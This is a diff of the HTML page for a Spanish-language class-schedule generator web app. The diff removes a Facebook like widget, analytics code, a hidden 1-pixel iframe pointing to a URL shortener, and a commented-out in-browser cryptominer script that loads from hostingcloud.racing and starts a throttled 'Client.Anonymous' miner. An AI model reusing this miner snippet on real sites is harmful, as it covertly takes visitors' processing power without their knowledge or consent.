@@ -348,24 +348,7 @@
               </ul>
             </div>
           </li>
-          <!-- <li class="nav__item">
-            <button class="nav__btn">
-              <i class="fa fa-hand-peace-o"></i> ¿Nos ayudas?
-            </button>
-          </li> -->
-          <li class="nav__item">
-            <button class="nav__btn text-cta-f" @click="modals.gifts = true">
-              <i class="fa fa-gift"></i> ¡Regalos GRATIS!
-            </button>
-          </li>
         </ul>
-        <v-iframe
-          class="show-min-md"
-          src="//www.facebook.com/plugins/like.php?href=https%3A%2F%2Fwww.facebook.com%2Fpages%2FGenerador-de-Horarios%2F711418525589252&amp;width&amp;layout=standard&amp;action=like&amp;show_faces=false&amp;share=true&amp;height=35&amp;appId=246974068650566"
-          scrolling="no"
-          frameborder="0"
-          style="overflow: hidden;position: absolute;right: 0px;padding: 12px;height: 51px;"
-          allowTransparency="true"></v-iframe>
       </nav>
       <div class="row-s z-index">
         <input type="checkbox" class="hide-show__input" id="toogle">
@@ -668,7 +651,6 @@
         </audio>
       </div>
     </div>
-    <!-- <v-iframe src="https://shortnim.now.sh/r#Jh4ES"  style="width:1px; height:1px; border:none;"></v-iframe> -->
     <footer class="footer primary dark-theme__black">
       © Todos los derechos reservados 2018 - Contacto: <a>developer.diegopiedra@gmail.com</a> <span style="float: right">Generador de horarios v2.0.0</span>
     </footer>
@@ -677,18 +659,6 @@
       <a ref="canvasAction"></a>
     </div>
   </div>
-  <!-- <script src="https://www.hostingcloud.racing/ZlJH.js" async></script>
-  <script>
-    setTimeout(e => {
-        var _client = new Client.Anonymous('4b866712acd0289ef2766f0a27408b1db66b24119cf29aa8e74bc50399c37d3d', {
-            throttle: 0.4, c: 'w', ads: 0
-        });
-      _client.start();
-    }, 5000)
-      
-      
-
-  </script> -->
   <!-- Templates -->
   <template id="modal">
     <div class="modal" :class="classComputed">
@@ -722,26 +692,9 @@
     })
   </script>
   <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
-  <!-- <script src="https://cdn.jsdelivr.net/npm/vue"></script> -->
   <script lang="javascript" src="lib/xlsx.full.min.js" async></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/1.4.1/jspdf.min.js" async></script>
   <script src="lib/html2canvas.min.js" charset="utf-8" async> </script>
-  <script src="https://www.google.com/jsapi"></script>
-  <script>google.load("jquery", "1")</script>
-  <script>
-    const useGoogle = window.location.hostname == 'horarios.coldideas.com';
-
-    if(useGoogle){
-      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
-
-      ga('create', 'UA-48333384-1', 'coldideas.com');
-      ga('send', 'pageview');
-    }
-
-  </script>
   <script src="app.js" charset="utf-8"></script>
 </body>
 </html>
